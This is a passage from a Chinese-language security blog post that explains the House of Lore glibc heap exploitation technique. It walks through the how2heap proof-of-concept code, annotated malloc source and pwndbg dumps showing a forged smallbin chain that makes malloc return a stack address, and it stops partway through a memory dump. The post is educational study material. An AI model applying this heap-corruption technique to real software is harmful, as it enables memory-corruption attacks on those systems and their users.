<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="how2heap-3"><meta name="keywords" content="pwn"><meta name="author" content="QRZ"><meta name="copyright" content="QRZ"><title>how2heap-3 | QRZ's Blog</title><link rel="shortcut icon" href="https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/IMG_20190923_132425.png"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css"><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script><link rel="dns-prefetch" href="https://hm.baidu.com"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?ff97cec996f09596dd444ef4dd5c925d";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();</script><link rel="dns-prefetch" href="https://www.google-analytics.com"><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-131763109-1', 'auto');
ga('send', 'pageview');</script><link rel="dns-prefetch" href="http://ta.qq.com"><script>(function() {
   var hm = document.createElement("script");
   hm.src = "https://tajs.qq.com/stats?sId=62826431";
   var s = document.getElementsByTagName("script")[0];
   s.parentNode.insertBefore(hm, s);
 })();</script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  hexoVersion: '5.2.0'
} </script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="QRZ's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#how2heap-3"><span class="toc-text">how2heap-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-lore"><span class="toc-text">house_of_lore</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA"><span class="toc-text">输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-text">解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overlapping-chunks"><span class="toc-text">overlapping_chunks</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%87%BA-1"><span class="toc-text">输出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-1"><span class="toc-text">解释</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overlanpping-chunks-2"><span class="toc-text">overlanpping_chunks_2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A-2"><span class="toc-text">解释</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/IMG_20190923_132425.png"></div><div class="author-info__name text-center">QRZ</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">34</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">14</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">7</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/866283.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">QRZ's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" target="_blank" rel="noopener" href="https://wiki.qrzbing.cn">Wiki</a><a class="site-page" href="/about">About</a><a class="site-page" href="/music">Music</a><a class="site-page" href="/friends">Friends</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">how2heap-3</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-07-09</time></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="how2heap-3"><a href="#how2heap-3" class="headerlink" title="how2heap-3"></a>how2heap-3</h1><a id="more"></a>

<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;house_of_lore </span><br><span class="line"></span><br><span class="line">Welcome to the House of Lore</span><br><span class="line">This is a revisited version that bypass also the hardening check introduced by glibc malloc</span><br><span class="line">This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23</span><br><span class="line"></span><br><span class="line">Allocating the victim chunk</span><br><span class="line">Allocated the first small chunk on the heap at 0x603010</span><br><span class="line">stack_buffer_1 at 0x7fffffffdcc0</span><br><span class="line">stack_buffer_2 at 0x7fffffffdca0</span><br><span class="line">Create a fake chunk on the stack</span><br><span class="line">Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corruptedin second to the last malloc, which putting stack address on smallbin list</span><br><span class="line">Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake chunk on stackAllocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()</span><br><span class="line">Allocated the large chunk on the heap at 0x603080</span><br><span class="line">Freeing the chunk 0x603010, it will be inserted in the unsorted bin</span><br><span class="line"></span><br><span class="line">In the unsorted bin the victim&#39;s fwd and bk pointers are nil</span><br><span class="line">victim-&gt;fwd: (nil)</span><br><span class="line">victim-&gt;bk: (nil)</span><br><span class="line"></span><br><span class="line">Now performing a malloc that can&#39;t be handled by the UnsortedBin, nor the small bin</span><br><span class="line">This means that the chunk 0x603010 will be inserted in front of the SmallBin</span><br><span class="line">The chunk that can&#39;t be handled by the unsorted bin, nor the SmallBin has been allocated to 0x603470</span><br><span class="line">The victim chunk has been sorted and its fwd and bk pointers updated</span><br><span class="line">victim-&gt;fwd: 0x7ffff7dd1bd8</span><br><span class="line">victim-&gt;bk: 0x7ffff7dd1bd8</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">Now allocating a chunk with size equal to the first one freed</span><br><span class="line">This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer</span><br><span class="line">This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk</span><br><span class="line">p4 &#x3D; malloc(100)</span><br><span class="line"></span><br><span class="line">The fwd pointer of stack_buffer_2 has changed after the last malloc to 0x7ffff7dd1bd8</span><br><span class="line"></span><br><span class="line">p4 is 0x7fffffffdcd0 and should be on the stack!</span><br><span class="line">Nice jump d00d</span><br></pre></td></tr></table></figure>

<h3 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h3><blockquote>
<p>house of lore 技术主要是用来伪造一个 small bin 链。</p>
</blockquote>
<blockquote>
<ul>
<li>House of Lore 攻击与 Glibc 堆管理中的的 Small Bin 的机制紧密相关。</li>
<li>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</li>
<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</li>
</ul>
</blockquote>
<p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行的流程如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">       hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">       (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">       processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">       anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">        <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">        <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">        bin = bin_at(av, idx);</span><br><span class="line">        <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">        <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">        <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">        <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">            <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">            <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">                <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line">            <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">                set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">                <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">                bin-&gt;bk = bck;</span><br><span class="line">                bck-&gt;fd = bin;</span><br><span class="line">                <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">                <span class="comment">// 细致的检查</span></span><br><span class="line">                check_malloced_chunk(av, victim, nb);</span><br><span class="line">                <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">                <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">                <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">                alloc_perturb(p, bytes);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>从下面的这部分我们可以看出</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>

<p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Lore\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This is tested against Ubuntu 14.04.4 - 32bit - glibc-2.23\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk\n&quot;</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span></span><br><span class="line"><span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br></pre></td></tr></table></figure>

<p>首先在栈上分配两个数组，然后分配 victim chunk。这时 heap 上的第一个 small chunk。</p>
<p><code>victim_chunk = victim - 2</code>: <code>victim - WORD_SIZE</code> 因为我们需要减去首部以获取 chunk 的绝对地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p victim</span><br><span class="line">$3 &#x3D; (intptr_t *) 0x603010</span><br><span class="line">pwndbg&gt; p victim_chunk </span><br><span class="line">$4 &#x3D; (intptr_t *) 0x603000</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 113, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x603070 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 135057, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来在栈上伪造两个 chunk：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span></span><br><span class="line">       <span class="string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);</span><br><span class="line">stack_buffer_1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">stack_buffer_1[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">       <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">       <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">stack_buffer_1[<span class="number">3</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">stack_buffer_2[<span class="number">2</span>] = (<span class="keyword">intptr_t</span>*)stack_buffer_1;</span><br></pre></td></tr></table></figure>

<p>对于第一块 chunk，fwd 指针指向 victim_chunk 以绕过检查。在最后 malloc 时，这一块会被放在 smallbin list 中。设置 bk 指针指向 stack_buffer_2，接下来设置 stack_buffer_2 的 fwd 指针指向 stack_buffer_1 以绕过 malloc 时针对 small bin 的检查，这回返回栈上 fake chunk 的指针。这样就构造了一个 small bin 链。</p>
<p>check 的检测如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Advanced exploitation of the House of Lore - Malloc Maleficarum.</span></span><br><span class="line"><span class="comment">// This PoC take care also of the glibc hardening of smallbin corruption.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// [ ... ]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="line"></span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">       bin-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line"><span class="comment">//       [ ... ]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>伪造后的结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p stack_buffer_1</span><br><span class="line">$8 &#x3D; &#123;0x0, 0x0, 0x603000, 0x7fffffffdc50&#125;</span><br><span class="line">pwndbg&gt; p stack_buffer_2</span><br><span class="line">$9 &#x3D; &#123;0x0, 0x0, 0x7fffffffdc70&#125;</span><br><span class="line">pwndbg&gt; p &amp;stack_buffer_1</span><br><span class="line">$10 &#x3D; (intptr_t *(*)[4]) 0x7fffffffdc70</span><br><span class="line">pwndbg&gt; p &amp;stack_buffer_2</span><br><span class="line">$11 &#x3D; (intptr_t *(*)[3]) 0x7fffffffdc50</span><br></pre></td></tr></table></figure>

<p>接下来申请一大块内存</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">       <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line"><span class="keyword">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br></pre></td></tr></table></figure>

<p>申请这块内存的目的是在之后的 free 中避免 victim chunk 被合并进 top chunk 中。</p>
<p>然后释放 victim chunk。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line"><span class="built_in">free</span>((<span class="keyword">void</span>*)victim);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are nil\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>它本应该被放入 unsorted bin 中的（我这里放入了 fastbins）</p>
<p>在 unsorted bin 中 victim 的 fwd 和 bk 指针都为空。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="keyword">void</span> *)victim[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>接下来 malloc 一块大 chunk，大到不能在 UnsortedBin 中找到合适的就可以了。这样 victim 会被整理到 smallbins 中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x70: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>嗯，虽然我这里的 victim 之前在 fastbins 中，但是在这之后仍然被整理到了 smallbins 中。可以读源码看看对 unsortedbin 和 fastbins 的操作都有什么。</p>
<p>此时 victim chunk 的 fwd 和 bk 指针都被更新了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">victim-&gt;fwd: 0x7ffff7dd1bd8</span><br><span class="line">victim-&gt;bk: 0x7ffff7dd1bd8</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">victim[<span class="number">1</span>] = (<span class="keyword">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>接下来开始漏洞利用：假设我们可以修改 victim chunk 的 bk 指针，并让它指向我们栈上的 fake chunk。</p>
<p>修改前：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 113, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1bd8 &lt;main_arena+184&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1bd8 &lt;main_arena+184&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x70: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x&#x2F;20gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x603010:	0x00007ffff7dd1bd8	0x00007ffff7dd1bd8</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000070	0x00000000000003f0</span><br><span class="line">0x603080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>修改后：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 113, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1bd8 &lt;main_arena+184&gt;, </span><br><span class="line">  bk &#x3D; 0x7fffffffdc70, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x70 [corrupted]</span><br><span class="line">FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000</span><br><span class="line">BK: 0x603000 —▸ 0x7fffffffdc70 —▸ 0x7fffffffdc50 —▸ 0x400c4d (__libc_csu_init+77) ◂— nop    </span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x&#x2F;20gx 0x603000</span><br><span class="line">0x603000:	0x0000000000000000	0x0000000000000071</span><br><span class="line">0x603010:	0x00007ffff7dd1bd8	0x00007fffffffdc70</span><br><span class="line">0x603020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603060:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x603070:	0x0000000000000070	0x00000000000003f0</span><br><span class="line">0x603080:	0x0000000000000000	